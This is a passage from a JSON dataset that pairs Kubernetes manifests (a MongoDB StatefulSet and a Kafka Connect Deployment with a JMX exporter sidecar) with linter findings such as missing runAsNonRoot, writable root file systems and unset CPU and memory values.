    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        command:\n        - mongod\n        - --bind_ip_all\n        - --replSet\n        - rs0\n        ports:\n        - containerPort: 27017\n        volumeMounts:\n        - name: mongo-volume\n          mountPath: /data/db\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongo\" does not have a read-only root file system"
  },
  {
    "id": "9324",
    "manifest_path": "data/manifests/the_stack_sample/sample_3529.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        command:\n        - mongod\n        - --bind_ip_all\n        - --replSet\n        - rs0\n        ports:\n        - containerPort: 27017\n        volumeMounts:\n        - name: mongo-volume\n          mountPath: /data/db\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongo\" is not set to runAsNonRoot"
  },
  {
    "id": "9325",
    "manifest_path": "data/manifests/the_stack_sample/sample_3529.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        command:\n        - mongod\n        - --bind_ip_all\n        - --replSet\n        - rs0\n        ports:\n        - containerPort: 27017\n        volumeMounts:\n        - name: mongo-volume\n          mountPath: /data/db\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongo\" has cpu request 0"
  },
  {
    "id": "9326",
    "manifest_path": "data/manifests/the_stack_sample/sample_3529.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        command:\n        - mongod\n        - --bind_ip_all\n        - --replSet\n        - rs0\n        ports:\n        - containerPort: 27017\n        volumeMounts:\n        - name: mongo-volume\n          mountPath: /data/db\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongo\" has memory limit 0"
  },
  {
    "id": "9327",
    "manifest_path": "data/manifests/the_stack_sample/sample_3532.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n    meta.helm.sh/release-name: think-confluent\n    meta.helm.sh/release-namespace: kafka\n  labels:\n    app: cp-kafka-connect\n    app.kubernetes.io/managed-by: Helm\n    chart: cp-kafka-connect-0.1.0\n    heritage: Helm\n    release: think-confluent\n  name: think-confluent-cp-kafka-connect\n  namespace: kafka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cp-kafka-connect\n      release: think-confluent\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '5556'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: cp-kafka-connect\n        release: think-confluent\n    spec:\n      containers:\n      - command:\n        - java\n        - -XX:+UnlockExperimentalVMOptions\n        - -XX:+UseCGroupMemoryLimitForHeap\n        - -XX:MaxRAMFraction=1\n        - -XshowSettings:vm\n        - -jar\n        - jmx_prometheus_httpserver.jar\n        - '5556'\n        - /etc/jmx-kafka-connect/jmx-kafka-connect-prometheus.yml\n        image: solsson/kafka-prometheus-jmx-exporter@sha256:6f82e2b0464f50da8104acd7363fb9b995001ddff77d248379f8788e78946143\n        imagePullPolicy: IfNotPresent\n        name: prometheus-jmx-exporter\n        ports:\n        - containerPort: 5556\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/jmx-kafka-connect\n          name: jmx-config\n      - env:\n        - name: CONNECT_REST_ADVERTISED_HOST_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: CONNECT_BOOTSTRAP_SERVERS\n          value: PLAINTEXT://think-confluent-cp-kafka-headless:9092\n        - name: CONNECT_GROUP_ID\n          value: think-confluent\n        - name: CONNECT_CONFIG_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-config\n        - name: CONNECT_OFFSET_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-offset\n        - name: CONNECT_STATUS_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-status\n        - name: CONNECT_KEY_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: CONNECT_VALUE_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: KAFKA_HEAP_OPTS\n          value: -Xms512M -Xmx512M\n        - name: CONNECT_CONFIG_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_INTERNAL_KEY_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_INTERNAL_VALUE_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_KEY_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_KEY_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: CONNECT_OFFSET_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_PLUGIN_PATH\n          value: /usr/share/java,/usr/share/confluent-hub-components\n        - name: CONNECT_STATUS_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_VALUE_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_VALUE_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: KAFKA_JMX_PORT\n          value: '5555'\n        image: confluentinc/cp-kafka-connect:5.5.0\n        imagePullPolicy: IfNotPresent\n        name: cp-kafka-connect-server\n        ports:\n        - containerPort: 8083\n          name: kafka-connect\n          protocol: TCP\n        - containerPort: 5555\n          name: jmx\n          protocol: TCP\n        resources: {}\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: think-confluent-cp-kafka-connect-jmx-configmap\n        name: jmx-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cp-kafka-connect-server\" does not have a read-only root file system"
  },
  {
    "id": "9328",
    "manifest_path": "data/manifests/the_stack_sample/sample_3532.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n    meta.helm.sh/release-name: think-confluent\n    meta.helm.sh/release-namespace: kafka\n  labels:\n    app: cp-kafka-connect\n    app.kubernetes.io/managed-by: Helm\n    chart: cp-kafka-connect-0.1.0\n    heritage: Helm\n    release: think-confluent\n  name: think-confluent-cp-kafka-connect\n  namespace: kafka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cp-kafka-connect\n      release: think-confluent\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '5556'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: cp-kafka-connect\n        release: think-confluent\n    spec:\n      containers:\n      - command:\n        - java\n        - -XX:+UnlockExperimentalVMOptions\n        - -XX:+UseCGroupMemoryLimitForHeap\n        - -XX:MaxRAMFraction=1\n        - -XshowSettings:vm\n        - -jar\n        - jmx_prometheus_httpserver.jar\n        - '5556'\n        - /etc/jmx-kafka-connect/jmx-kafka-connect-prometheus.yml\n        image: solsson/kafka-prometheus-jmx-exporter@sha256:6f82e2b0464f50da8104acd7363fb9b995001ddff77d248379f8788e78946143\n        imagePullPolicy: IfNotPresent\n        name: prometheus-jmx-exporter\n        ports:\n        - containerPort: 5556\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/jmx-kafka-connect\n          name: jmx-config\n      - env:\n        - name: CONNECT_REST_ADVERTISED_HOST_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: CONNECT_BOOTSTRAP_SERVERS\n          value: PLAINTEXT://think-confluent-cp-kafka-headless:9092\n        - name: CONNECT_GROUP_ID\n          value: think-confluent\n        - name: CONNECT_CONFIG_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-config\n        - name: CONNECT_OFFSET_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-offset\n        - name: CONNECT_STATUS_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-status\n        - name: CONNECT_KEY_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: CONNECT_VALUE_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: KAFKA_HEAP_OPTS\n          value: -Xms512M -Xmx512M\n        - name: CONNECT_CONFIG_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_INTERNAL_KEY_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_INTERNAL_VALUE_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_KEY_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_KEY_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: CONNECT_OFFSET_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_PLUGIN_PATH\n          value: /usr/share/java,/usr/share/confluent-hub-components\n        - name: CONNECT_STATUS_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_VALUE_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_VALUE_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: KAFKA_JMX_PORT\n          value: '5555'\n        image: confluentinc/cp-kafka-connect:5.5.0\n        imagePullPolicy: IfNotPresent\n        name: cp-kafka-connect-server\n        ports:\n        - containerPort: 8083\n          name: kafka-connect\n          protocol: TCP\n        - containerPort: 5555\n          name: jmx\n          protocol: TCP\n        resources: {}\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: think-confluent-cp-kafka-connect-jmx-configmap\n        name: jmx-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus-jmx-exporter\" does not have a read-only root file system"
  },
  {
    "id": "9329",
    "manifest_path": "data/manifests/the_stack_sample/sample_3532.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n    meta.helm.sh/release-name: think-confluent\n    meta.helm.sh/release-namespace: kafka\n  labels:\n    app: cp-kafka-connect\n    app.kubernetes.io/managed-by: Helm\n    chart: cp-kafka-connect-0.1.0\n    heritage: Helm\n    release: think-confluent\n  name: think-confluent-cp-kafka-connect\n  namespace: kafka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cp-kafka-connect\n      release: think-confluent\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '5556'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: cp-kafka-connect\n        release: think-confluent\n    spec:\n      containers:\n      - command:\n        - java\n        - -XX:+UnlockExperimentalVMOptions\n        - -XX:+UseCGroupMemoryLimitForHeap\n        - -XX:MaxRAMFraction=1\n        - -XshowSettings:vm\n        - -jar\n        - jmx_prometheus_httpserver.jar\n        - '5556'\n        - /etc/jmx-kafka-connect/jmx-kafka-connect-prometheus.yml\n        image: solsson/kafka-prometheus-jmx-exporter@sha256:6f82e2b0464f50da8104acd7363fb9b995001ddff77d248379f8788e78946143\n        imagePullPolicy: IfNotPresent\n        name: prometheus-jmx-exporter\n        ports:\n        - containerPort: 5556\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/jmx-kafka-connect\n          name: jmx-config\n      - env:\n        - name: CONNECT_REST_ADVERTISED_HOST_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: CONNECT_BOOTSTRAP_SERVERS\n          value: PLAINTEXT://think-confluent-cp-kafka-headless:9092\n        - name: CONNECT_GROUP_ID\n          value: think-confluent\n        - name: CONNECT_CONFIG_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-config\n        - name: CONNECT_OFFSET_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-offset\n        - name: CONNECT_STATUS_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-status\n        - name: CONNECT_KEY_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: CONNECT_VALUE_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: KAFKA_HEAP_OPTS\n          value: -Xms512M -Xmx512M\n        - name: CONNECT_CONFIG_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_INTERNAL_KEY_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_INTERNAL_VALUE_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_KEY_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_KEY_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: CONNECT_OFFSET_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_PLUGIN_PATH\n          value: /usr/share/java,/usr/share/confluent-hub-components\n        - name: CONNECT_STATUS_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_VALUE_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_VALUE_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: KAFKA_JMX_PORT\n          value: '5555'\n        image: confluentinc/cp-kafka-connect:5.5.0\n        imagePullPolicy: IfNotPresent\n        name: cp-kafka-connect-server\n        ports:\n        - containerPort: 8083\n          name: kafka-connect\n          protocol: TCP\n        - containerPort: 5555\n          name: jmx\n          protocol: TCP\n        resources: {}\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: think-confluent-cp-kafka-connect-jmx-configmap\n        name: jmx-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cp-kafka-connect-server\" is not set to runAsNonRoot"
  },
  {
    "id": "9330",
    "manifest_path": "data/manifests/the_stack_sample/sample_3532.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n    meta.helm.sh/release-name: think-confluent\n    meta.helm.sh/release-namespace: kafka\n  labels:\n    app: cp-kafka-connect\n    app.kubernetes.io/managed-by: Helm\n    chart: cp-kafka-connect-0.1.0\n    heritage: Helm\n    release: think-confluent\n  name: think-confluent-cp-kafka-connect\n  namespace: kafka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cp-kafka-connect\n      release: think-confluent\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '5556'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: cp-kafka-connect\n        release: think-confluent\n    spec:\n      containers:\n      - command:\n        - java\n        - -XX:+UnlockExperimentalVMOptions\n        - -XX:+UseCGroupMemoryLimitForHeap\n        - -XX:MaxRAMFraction=1\n        - -XshowSettings:vm\n        - -jar\n        - jmx_prometheus_httpserver.jar\n        - '5556'\n        - /etc/jmx-kafka-connect/jmx-kafka-connect-prometheus.yml\n        image: solsson/kafka-prometheus-jmx-exporter@sha256:6f82e2b0464f50da8104acd7363fb9b995001ddff77d248379f8788e78946143\n        imagePullPolicy: IfNotPresent\n        name: prometheus-jmx-exporter\n        ports:\n        - containerPort: 5556\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/jmx-kafka-connect\n          name: jmx-config\n      - env:\n        - name: CONNECT_REST_ADVERTISED_HOST_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: CONNECT_BOOTSTRAP_SERVERS\n          value: PLAINTEXT://think-confluent-cp-kafka-headless:9092\n        - name: CONNECT_GROUP_ID\n          value: think-confluent\n        - name: CONNECT_CONFIG_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-config\n        - name: CONNECT_OFFSET_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-offset\n        - name: CONNECT_STATUS_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-status\n        - name: CONNECT_KEY_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: CONNECT_VALUE_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: KAFKA_HEAP_OPTS\n          value: -Xms512M -Xmx512M\n        - name: CONNECT_CONFIG_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_INTERNAL_KEY_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_INTERNAL_VALUE_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_KEY_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_KEY_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: CONNECT_OFFSET_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_PLUGIN_PATH\n          value: /usr/share/java,/usr/share/confluent-hub-components\n        - name: CONNECT_STATUS_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_VALUE_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_VALUE_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: KAFKA_JMX_PORT\n          value: '5555'\n        image: confluentinc/cp-kafka-connect:5.5.0\n        imagePullPolicy: IfNotPresent\n        name: cp-kafka-connect-server\n        ports:\n        - containerPort: 8083\n          name: kafka-connect\n          protocol: TCP\n        - containerPort: 5555\n          name: jmx\n          protocol: TCP\n        resources: {}\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: think-confluent-cp-kafka-connect-jmx-configmap\n        name: jmx-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prometheus-jmx-exporter\" is not set to runAsNonRoot"
  },
  {
    "id": "9331",
    "manifest_path": "data/manifests/the_stack_sample/sample_3532.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n    meta.helm.sh/release-name: think-confluent\n    meta.helm.sh/release-namespace: kafka\n  labels:\n    app: cp-kafka-connect\n    app.kubernetes.io/managed-by: Helm\n    chart: cp-kafka-connect-0.1.0\n    heritage: Helm\n    release: think-confluent\n  name: think-confluent-cp-kafka-connect\n  namespace: kafka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cp-kafka-connect\n      release: think-confluent\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '5556'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: cp-kafka-connect\n        release: think-confluent\n    spec:\n      containers:\n      - command:\n        - java\n        - -XX:+UnlockExperimentalVMOptions\n        - -XX:+UseCGroupMemoryLimitForHeap\n        - -XX:MaxRAMFraction=1\n        - -XshowSettings:vm\n        - -jar\n        - jmx_prometheus_httpserver.jar\n        - '5556'\n        - /etc/jmx-kafka-connect/jmx-kafka-connect-prometheus.yml\n        image: solsson/kafka-prometheus-jmx-exporter@sha256:6f82e2b0464f50da8104acd7363fb9b995001ddff77d248379f8788e78946143\n        imagePullPolicy: IfNotPresent\n        name: prometheus-jmx-exporter\n        ports:\n        - containerPort: 5556\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/jmx-kafka-connect\n          name: jmx-config\n      - env:\n        - name: CONNECT_REST_ADVERTISED_HOST_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: CONNECT_BOOTSTRAP_SERVERS\n          value: PLAINTEXT://think-confluent-cp-kafka-headless:9092\n        - name: CONNECT_GROUP_ID\n          value: think-confluent\n        - name: CONNECT_CONFIG_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-config\n        - name: CONNECT_OFFSET_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-offset\n        - name: CONNECT_STATUS_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-status\n        - name: CONNECT_KEY_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: CONNECT_VALUE_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: KAFKA_HEAP_OPTS\n          value: -Xms512M -Xmx512M\n        - name: CONNECT_CONFIG_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_INTERNAL_KEY_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_INTERNAL_VALUE_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_KEY_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_KEY_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: CONNECT_OFFSET_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_PLUGIN_PATH\n          value: /usr/share/java,/usr/share/confluent-hub-components\n        - name: CONNECT_STATUS_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_VALUE_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_VALUE_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: KAFKA_JMX_PORT\n          value: '5555'\n        image: confluentinc/cp-kafka-connect:5.5.0\n        imagePullPolicy: IfNotPresent\n        name: cp-kafka-connect-server\n        ports:\n        - containerPort: 8083\n          name: kafka-connect\n          protocol: TCP\n        - containerPort: 5555\n          name: jmx\n          protocol: TCP\n        resources: {}\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: think-confluent-cp-kafka-connect-jmx-configmap\n        name: jmx-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cp-kafka-connect-server\" has cpu request 0"
  },
  {
    "id": "9332",
    "manifest_path": "data/manifests/the_stack_sample/sample_3532.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n    meta.helm.sh/release-name: think-confluent\n    meta.helm.sh/release-namespace: kafka\n  labels:\n    app: cp-kafka-connect\n    app.kubernetes.io/managed-by: Helm\n    chart: cp-kafka-connect-0.1.0\n    heritage: Helm\n    release: think-confluent\n  name: think-confluent-cp-kafka-connect\n  namespace: kafka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cp-kafka-connect\n      release: think-confluent\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '5556'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: cp-kafka-connect\n        release: think-confluent\n    spec:\n      containers:\n      - command:\n        - java\n        - -XX:+UnlockExperimentalVMOptions\n        - -XX:+UseCGroupMemoryLimitForHeap\n        - -XX:MaxRAMFraction=1\n        - -XshowSettings:vm\n        - -jar\n        - jmx_prometheus_httpserver.jar\n        - '5556'\n        - /etc/jmx-kafka-connect/jmx-kafka-connect-prometheus.yml\n        image: solsson/kafka-prometheus-jmx-exporter@sha256:6f82e2b0464f50da8104acd7363fb9b995001ddff77d248379f8788e78946143\n        imagePullPolicy: IfNotPresent\n        name: prometheus-jmx-exporter\n        ports:\n        - containerPort: 5556\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/jmx-kafka-connect\n          name: jmx-config\n      - env:\n        - name: CONNECT_REST_ADVERTISED_HOST_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: CONNECT_BOOTSTRAP_SERVERS\n          value: PLAINTEXT://think-confluent-cp-kafka-headless:9092\n        - name: CONNECT_GROUP_ID\n          value: think-confluent\n        - name: CONNECT_CONFIG_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-config\n        - name: CONNECT_OFFSET_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-offset\n        - name: CONNECT_STATUS_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-status\n        - name: CONNECT_KEY_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: CONNECT_VALUE_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: KAFKA_HEAP_OPTS\n          value: -Xms512M -Xmx512M\n        - name: CONNECT_CONFIG_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_INTERNAL_KEY_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_INTERNAL_VALUE_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_KEY_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_KEY_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: CONNECT_OFFSET_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_PLUGIN_PATH\n          value: /usr/share/java,/usr/share/confluent-hub-components\n        - name: CONNECT_STATUS_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_VALUE_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_VALUE_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: KAFKA_JMX_PORT\n          value: '5555'\n        image: confluentinc/cp-kafka-connect:5.5.0\n        imagePullPolicy: IfNotPresent\n        name: cp-kafka-connect-server\n        ports:\n        - containerPort: 8083\n          name: kafka-connect\n          protocol: TCP\n        - containerPort: 5555\n          name: jmx\n          protocol: TCP\n        resources: {}\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: think-confluent-cp-kafka-connect-jmx-configmap\n        name: jmx-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prometheus-jmx-exporter\" has cpu request 0"
  },
  {
    "id": "9333",
    "manifest_path": "data/manifests/the_stack_sample/sample_3532.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n    meta.helm.sh/release-name: think-confluent\n    meta.helm.sh/release-namespace: kafka\n  labels:\n    app: cp-kafka-connect\n    app.kubernetes.io/managed-by: Helm\n    chart: cp-kafka-connect-0.1.0\n    heritage: Helm\n    release: think-confluent\n  name: think-confluent-cp-kafka-connect\n  namespace: kafka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cp-kafka-connect\n      release: think-confluent\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '5556'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: cp-kafka-connect\n        release: think-confluent\n    spec:\n      containers:\n      - command:\n        - java\n        - -XX:+UnlockExperimentalVMOptions\n        - -XX:+UseCGroupMemoryLimitForHeap\n        - -XX:MaxRAMFraction=1\n        - -XshowSettings:vm\n        - -jar\n        - jmx_prometheus_httpserver.jar\n        - '5556'\n        - /etc/jmx-kafka-connect/jmx-kafka-connect-prometheus.yml\n        image: solsson/kafka-prometheus-jmx-exporter@sha256:6f82e2b0464f50da8104acd7363fb9b995001ddff77d248379f8788e78946143\n        imagePullPolicy: IfNotPresent\n        name: prometheus-jmx-exporter\n        ports:\n        - containerPort: 5556\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/jmx-kafka-connect\n          name: jmx-config\n      - env:\n        - name: CONNECT_REST_ADVERTISED_HOST_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: CONNECT_BOOTSTRAP_SERVERS\n          value: PLAINTEXT://think-confluent-cp-kafka-headless:9092\n        - name: CONNECT_GROUP_ID\n          value: think-confluent\n        - name: CONNECT_CONFIG_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-config\n        - name: CONNECT_OFFSET_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-offset\n        - name: CONNECT_STATUS_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-status\n        - name: CONNECT_KEY_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: CONNECT_VALUE_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: KAFKA_HEAP_OPTS\n          value: -Xms512M -Xmx512M\n        - name: CONNECT_CONFIG_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_INTERNAL_KEY_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_INTERNAL_VALUE_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_KEY_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_KEY_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: CONNECT_OFFSET_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_PLUGIN_PATH\n          value: /usr/share/java,/usr/share/confluent-hub-components\n        - name: 